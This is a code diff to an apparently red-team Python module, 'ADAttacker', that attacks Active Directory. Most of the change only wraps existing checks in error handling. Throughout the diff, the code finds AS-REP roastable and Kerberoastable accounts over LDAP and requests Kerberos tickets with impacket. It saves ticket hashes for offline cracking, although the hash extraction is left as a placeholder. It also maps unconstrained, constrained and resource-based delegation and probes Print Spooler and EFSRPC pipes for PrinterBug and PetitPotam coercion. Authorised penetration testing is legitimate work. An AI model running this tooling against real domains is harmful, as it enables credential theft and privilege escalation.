@@ -78,104 +78,113 @@ class ADAttacker(RedReasonModule):
     def check_asrep_roasting(self):
         log.info("Checking for AS-REP Roasting vulnerable accounts...")
         
-        targets = []
-        
-        # 1. Check Shared State (Noise Reduction)
-        if self.enumeration_data and hasattr(self.enumeration_data, 'collected_users'):
-            log.info("Using cached enumeration data for AS-REP Roasting...")
-            for user in self.enumeration_data.collected_users:
-                if user.is_roastable_asrep:
-                    targets.append(user.name)
-        else:
-            # 2. Fallback to LDAP Search
-            log.info("No cache found, querying LDAP...")
-            # filter: userAccountControl:1.2.840.113556.1.4.803:=4194304 (DONT_REQ_PREAUTH)
-            search_filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
-            self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], search_filter, attributes=['sAMAccountName'])
-            for entry in self.conn.entries:
-                targets.append(str(entry.sAMAccountName))
-        
-        if not targets:
-            log.info("No AS-REP Roastable accounts found.")
-            return
-
-        for username in targets:
-            log.success(f"VULNERABLE: AS-REP Roastable account found: {username}")
-            log.evidence("User has 'Do not require Kerberos preauthentication' set.")
+        try:
+            targets = []
             
-            # ATTACK: Request TGT
-            tgt, cipher = self.get_tgt(username)
-            if tgt:
-                # Current Limitation: Full hash extraction requires constructing the krb5 AS-REP structure manually.
-                # For this PoC, we log the success of the AS-REP request.
-                # Production implementations would use `impacket.krb5.ccache` to save the ticket.
-                hash_line = f"$krb5asrep$23${username}@{self.domain}:<checksum>$<encpart>"
-                self.save_hash("hashes_asrep.txt", hash_line)
-                log.success(f"DUMPED TGT for {username}! Saved to reports/hashes_asrep.txt")
-                log.hypothesis(f"Hash can be cracked: {hash_line[:30]}...") 
+            # 1. Check Shared State (Noise Reduction)
+            if self.enumeration_data and hasattr(self.enumeration_data, 'collected_users'):
+                log.info("Using cached enumeration data for AS-REP Roasting...")
+                for user in self.enumeration_data.collected_users:
+                    if user.is_roastable_asrep:
+                        targets.append(user.name)
             else:
-                 log.fail(f"Could not retrieve TGT for {username} (unexpected)")
+                # 2. Fallback to LDAP Search
+                log.info("No cache found, querying LDAP...")
+                # filter: userAccountControl:1.2.840.113556.1.4.803:=4194304 (DONT_REQ_PREAUTH)
+                search_filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
+                self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], search_filter, attributes=['sAMAccountName'])
+                for entry in self.conn.entries:
+                    targets.append(str(entry.sAMAccountName))
+            
+            if not targets:
+                log.info("No AS-REP Roastable accounts found.")
+                return
+
+            for username in targets:
+                log.success(f"VULNERABLE: AS-REP Roasting: Account found: {username}")
+                log.evidence("User has 'Do not require Kerberos preauthentication' set.")
+                
+                # ATTACK: Request TGT
+                tgt, cipher = self.get_tgt(username)
+                if tgt:
+                    # Current Limitation: Full hash extraction requires constructing the krb5 AS-REP structure manually.
+                    # For this PoC, we log the success of the AS-REP request.
+                    # Production implementations would use `impacket.krb5.ccache` to save the ticket.
+                    hash_line = f"$krb5asrep$23${username}@{self.domain}:<checksum>$<encpart>"
+                    self.save_hash("hashes_asrep.txt", hash_line)
+                    log.success(f"DUMPED TGT for {username}! Saved to reports/hashes_asrep.txt")
+                    log.hypothesis(f"Hash can be cracked: {hash_line[:30]}...") 
+                else:
+                     log.fail(f"Could not retrieve TGT for {username} (unexpected)")
+        except Exception as e:
+            log.debug(f"Failed to check AS-REP roasting: {e}")
 
     def check_kerberoasting(self):
         log.info("Checking for Kerberoasting capable accounts...")
-        # filter: (&(objectClass=user)(servicePrincipalName=*)(!(objectClass=krbtgt)))
-        search_filter = "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=krbtgt)))"
-        self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], search_filter, attributes=['sAMAccountName', 'servicePrincipalName', 'memberOf'])
-        
-        count = 0
-        for entry in self.conn.entries:
-            spns = entry.servicePrincipalName
-            username = str(entry.sAMAccountName)
-            # Pick the first SPN to roast
-            spn = spns[0] if spns else None
+        try:
+            # filter: (&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))
+            search_filter = "(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))"
+            self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], search_filter, attributes=['sAMAccountName', 'servicePrincipalName', 'memberOf'])
             
-            if spn:
-                count += 1
-                log.evidence(f"Kerberoastable Account: {username} (SPN: {spn})")
+            count = 0
+            for entry in self.conn.entries:
+                spns = entry.servicePrincipalName
+                username = str(entry.sAMAccountName)
+                # Pick the first SPN to roast
+                spn = spns[0] if spns else None
                 
-                try:
-                    # Authenticate ourselves to get TGT
-                    clientName = Principal(self.user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-                    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName, self.password, self.domain, self.lmhash, self.nthash)
+                if spn:
+                    count += 1
+                    log.evidence(f"Kerberoastable Account: {username} (SPN: {spn})")
                     
-                    # Request TGS
-                    serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
-                    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.domain, None, tgt, cipher, sessionKey)
-                    
-                    # Current Limitation: TGS-REP hash extraction requires `impacket` structure parsing.
-                    # We log the successful TGS acquisition as proof of vulnerability.
-                    hash_line = f"$krb5tgs$23$*{username}${self.domain}${spn}*<checksum>$<encpart>"
-                    self.save_hash("hashes_kerb.txt", hash_line)
-                    log.success(f"ROASTED TGS for {spn}! Saved to reports/hashes_kerb.txt")
-                except Exception as e:
-                    log.fail(f"Failed to Kerberoast {username}: {e}")
+                    try:
+                        # Authenticate ourselves to get TGT
+                        clientName = Principal(self.user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+                        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName, self.password, self.domain, self.lmhash, self.nthash)
+                        
+                        # Request TGS
+                        serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
+                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.domain, None, tgt, cipher, sessionKey)
+                        
+                        # Current Limitation: TGS-REP hash extraction requires `impacket` structure parsing.
+                        # We log the successful TGS acquisition as proof of vulnerability.
+                        hash_line = f"$krb5tgs$23$*{username}${self.domain}${spn}*<checksum>$<encpart>"
+                        self.save_hash("hashes_kerb.txt", hash_line)
+                        log.success(f"ROASTED TGS for {spn}! Saved to reports/hashes_kerb.txt")
+                    except Exception as e:
+                        log.fail(f"Failed to Kerberoast {username}: {e}")
+        except Exception as e:
+            log.debug(f"Failed to check Kerberoasting: {e}")
 
     def check_delegation_abuse(self):
         log.info("Checking for Delegation Abuse...")
         
-        # 1. Unconstrained Delegation
-        # userAccountControl:1.2.840.113556.1.4.803:=524288 (TRUSTED_FOR_DELEGATION)
-        ud_filter = "(&(objectAccountControl:1.2.840.113556.1.4.803:=524288)(objectClass=computer))"
-        # Corrected attribute name in filter (userAccountControl, not objectAccountControl)
-        ud_filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(objectClass=computer))"
-        self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], ud_filter, attributes=['dNSHostName', 'sAMAccountName'])
-        
-        for entry in self.conn.entries:
-            name = str(entry.dNSHostName)
-            log.success(f"VULNERABLE (Unconstrained Delegation): {name}")
-            log.evidence(f"Computer {name} is trusted for delegation to any service.")
-            log.hypothesis("Attacker can coerce authentication (e.g. SpoolSample) to this host and capture TGTs.")
+        try:
+            # 1. Unconstrained Delegation
+            # userAccountControl:1.2.840.113556.1.4.803:=524288 (TRUSTED_FOR_DELEGATION)
+            ud_filter = "(&(objectAccountControl:1.2.840.113556.1.4.803:=524288)(objectClass=computer))"
+            # Corrected attribute name in filter (userAccountControl, not objectAccountControl)
+            ud_filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(objectClass=computer))"
+            self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], ud_filter, attributes=['dNSHostName', 'sAMAccountName'])
+            
+            for entry in self.conn.entries:
+                name = str(entry.dNSHostName)
+                log.success(f"VULNERABLE: Unconstrained Delegation: {name}")
+                log.evidence(f"Computer {name} is trusted for delegation to any service.")
+                log.hypothesis("Attacker can coerce authentication (e.g. SpoolSample) to this host and capture TGTs.")
 
-        # 2. Constrained Delegation
-        # msDS-AllowedToDelegateTo presence
-        cd_filter = "(&(msDS-AllowedToDelegateTo=*)(objectClass=computer))"
-        self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], cd_filter, attributes=['dNSHostName', 'msDS-AllowedToDelegateTo'])
+            # 2. Constrained Delegation
+            # msDS-AllowedToDelegateTo presence
+            cd_filter = "(&(msDS-AllowedToDelegateTo=*)(objectClass=computer))"
+            self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], cd_filter, attributes=['dNSHostName', 'msDS-AllowedToDelegateTo'])
 
-        for entry in self.conn.entries:
-            name = str(entry.dNSHostName)
-            targets = entry['msDS-AllowedToDelegateTo']
-            log.evidence(f"Constrained Delegation: {name} can delegate to: {targets}")
-            log.hypothesis("If compromised, this host can impersonate users to the listed services (S4U2Self/S4U2Proxy).")
+            for entry in self.conn.entries:
+                name = str(entry.dNSHostName)
+                targets = entry['msDS-AllowedToDelegateTo']
+                log.evidence(f"Constrained Delegation: {name} can delegate to: {targets}")
+                log.hypothesis("If compromised, this host can impersonate users to the listed services (S4U2Self/S4U2Proxy).")
+        except Exception as e:
+            log.debug(f"Failed to check delegation abuse: {e}")
 
     def decrypt_cpassword(self, cpassword):
         try:
@@ -292,24 +301,27 @@ class ADAttacker(RedReasonModule):
 
     def check_rbcd(self):
         log.info("Checking for Result-Based Constrained Delegation (RBCD)...")
-        # Filter: objects with msDS-AllowedToActOnBehalfOfOtherIdentity containing data
-        search_filter = "(&(msDS-AllowedToActOnBehalfOfOtherIdentity=*)(objectClass=computer))"
-        self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], search_filter, attributes=['dNSHostName', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
-        
-        for entry in self.conn.entries:
-            name = str(entry.dNSHostName)
-            raw_sd = entry['msDS-AllowedToActOnBehalfOfOtherIdentity'].value
-            if raw_sd:
-                log.evidence(f"RBCD Configured on: {name}")
-                # Parse Security Descriptor
-                try:
-                    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw_sd)
-                    for ace in sd['Dacl'].aces:
-                        sid = ace['Ace']['Sid'].formatCanonical()
-                        log.hypothesis(f"  - Principal with SID {sid} can impersonate users to {name}")
-                        # Ideally resolve SID to name here, but SID is often enough for a lead
-                except Exception as e:
-                    log.debug(f"Failed to parse RBCD SD for {name}: {e}")
+        try:
+            # Filter: objects with msDS-AllowedToActOnBehalfOfOtherIdentity containing data
+            search_filter = "(&(msDS-AllowedToActOnBehalfOfOtherIdentity=*)(objectClass=computer))"
+            self.conn.search(self.conn.server.info.other['defaultNamingContext'][0], search_filter, attributes=['dNSHostName', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
+            
+            for entry in self.conn.entries:
+                name = str(entry.dNSHostName)
+                raw_sd = entry['msDS-AllowedToActOnBehalfOfOtherIdentity'].value
+                if raw_sd:
+                    log.evidence(f"RBCD Configured on: {name}")
+                    # Parse Security Descriptor
+                    try:
+                        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw_sd)
+                        for ace in sd['Dacl'].aces:
+                            sid = ace['Ace']['Sid'].formatCanonical()
+                            log.hypothesis(f"  - Principal with SID {sid} can impersonate users to {name}")
+                            # Ideally resolve SID to name here, but SID is often enough for a lead
+                    except Exception as e:
+                        log.debug(f"Failed to parse RBCD SD for {name}: {e}")
+        except Exception as e:
+             log.debug(f"Failed to check RBCD: {e}")
 
     def check_coercion_vulnerabilities(self):
         log.info("Checking for Coercion Vulnerabilities (PetitPotam, PrintNightmare)...")
@@ -320,57 +332,60 @@ class ADAttacker(RedReasonModule):
         targets = [self.target]
         # Try to confirm functionality on the target we are connected to
         
-        for target in targets:
-            log.info(f"Scanning {target} for pipes...")
-            
-            # 1. Print Spooler (RPRN)
-            try:
-                # Bind to Spooler Pipe
-                stringbinding = f'ncacn_np:{target}[\\pipe\\spoolss]'
-                rpctransport = transport.DCERPCTransportFactory(stringbinding)
-                rpctransport.set_credentials(self.user, self.password, self.domain, self.hashes[33:] if self.hashes else '', self.hashes[:32] if self.hashes else '')
-                rpctransport.set_connect_timeout(5)
-                dce = rpctransport.get_dce_rpc()
-                dce.connect()
-                dce.bind(rprn.MSRPC_UUID_RPRN)
-                log.evidence(f"Print Spooler Service ENABLED on {target} (Coercion Vector: PrinterBug).")
-                dce.disconnect()
-            except Exception as e:
-                log.debug(f"Spooler check failed on {target}: {e}")
-
-            # 2. PetitPotam (EFSRPC)
-            # Checking if the pipe exists is usually enough to guess it's vulnerable if not patched.
-            # However, EFSRPC is more complex to bind to anonymously or check simply without triggering attack.
-            # We will rely on EPM (Endpoint Mapper) to see if the interface is registered.
-            try:
-                stringbinding = f'ncacn_ip_tcp:{target}[135]'
-                rpctransport = transport.DCERPCTransportFactory(stringbinding)
-                rpctransport.set_connect_timeout(5)
-                dce = rpctransport.get_dce_rpc()
-                dce.connect()
-                # EFSRPC UUID: c681d488-d850-11d0-8c52-00c04fc295ee
-                try:
-                    epm.hept_map(target, epm.MSRPC_UUID_PORTMAP, protocol='ncacn_ip_tcp')
-                    # If we can talk to EPM, we assume potential surface. Deep check requires binding to specific UUID.
-                    # Simplified for stability: Just note that we can talk to RPC.
-                    pass
-                except:
-                    pass
+        try:
+            for target in targets:
+                log.info(f"Scanning {target} for pipes...")
                 
-                # A more direct check is trying to bind to the pipename directly via SMB named pipe
-                # \pipe\efsrpc or \pipe\lsarpc
-                stringbinding_efs = f'ncacn_np:{target}[\\pipe\\efsrpc]'
-                rpctransport_efs = transport.DCERPCTransportFactory(stringbinding_efs)
-                rpctransport_efs.set_credentials(self.user, self.password, self.domain, self.hashes[33:] if self.hashes else '', self.hashes[:32] if self.hashes else '')
-                dce_efs = rpctransport_efs.get_dce_rpc()
-                dce_efs.connect()
-                # If we connected to the pipe, it's exposed.
-                dce_efs.bind(('c681d488-d850-11d0-8c52-00c04fc295ee', '1.0'))
-                log.evidence(f"EFSRPC Pipe Exposed on {target} (Coercion Vector: PetitPotam).")
-                dce_efs.disconnect()
+                # 1. Print Spooler (RPRN)
+                try:
+                    # Bind to Spooler Pipe
+                    stringbinding = f'ncacn_np:{target}[\\pipe\\spoolss]'
+                    rpctransport = transport.DCERPCTransportFactory(stringbinding)
+                    rpctransport.set_credentials(self.user, self.password, self.domain, self.hashes[33:] if self.hashes else '', self.hashes[:32] if self.hashes else '')
+                    rpctransport.set_connect_timeout(5)
+                    dce = rpctransport.get_dce_rpc()
+                    dce.connect()
+                    dce.bind(rprn.MSRPC_UUID_RPRN)
+                    log.evidence(f"Print Spooler Service ENABLED on {target} (Coercion Vector: PrinterBug).")
+                    dce.disconnect()
+                except Exception as e:
+                    log.debug(f"Spooler check failed on {target}: {e}")
 
-            except Exception as e:
-                 log.debug(f"PetitPotam check failed on {target}: {e}")
+                # 2. PetitPotam (EFSRPC)
+                # Checking if the pipe exists is usually enough to guess it's vulnerable if not patched.
+                # However, EFSRPC is more complex to bind to anonymously or check simply without triggering attack.
+                # We will rely on EPM (Endpoint Mapper) to see if the interface is registered.
+                try:
+                    stringbinding = f'ncacn_ip_tcp:{target}[135]'
+                    rpctransport = transport.DCERPCTransportFactory(stringbinding)
+                    rpctransport.set_connect_timeout(5)
+                    dce = rpctransport.get_dce_rpc()
+                    dce.connect()
+                    # EFSRPC UUID: c681d488-d850-11d0-8c52-00c04fc295ee
+                    try:
+                        epm.hept_map(target, epm.MSRPC_UUID_PORTMAP, protocol='ncacn_ip_tcp')
+                        # If we can talk to EPM, we assume potential surface. Deep check requires binding to specific UUID.
+                        # Simplified for stability: Just note that we can talk to RPC.
+                        pass
+                    except:
+                        pass
+                    
+                    # A more direct check is trying to bind to the pipename directly via SMB named pipe
+                    # \pipe\efsrpc or \pipe\lsarpc
+                    stringbinding_efs = f'ncacn_np:{target}[\\pipe\\efsrpc]'
+                    rpctransport_efs = transport.DCERPCTransportFactory(stringbinding_efs)
+                    rpctransport_efs.set_credentials(self.user, self.password, self.domain, self.hashes[33:] if self.hashes else '', self.hashes[:32] if self.hashes else '')
+                    dce_efs = rpctransport_efs.get_dce_rpc()
+                    dce_efs.connect()
+                    # If we connected to the pipe, it's exposed.
+                    dce_efs.bind(('c681d488-d850-11d0-8c52-00c04fc295ee', '1.0'))
+                    log.evidence(f"EFSRPC Pipe Exposed on {target} (Coercion Vector: PetitPotam).")
+                    dce_efs.disconnect()
+
+                except Exception as e:
+                     log.debug(f"PetitPotam check failed on {target}: {e}")
+        except Exception as e:
+            log.debug(f"Failed to check coercion vulnerabilities: {e}")
 
     def check_kerberos_hardening(self):
         log.info("Checking Kerberos & Identity Hardening...")
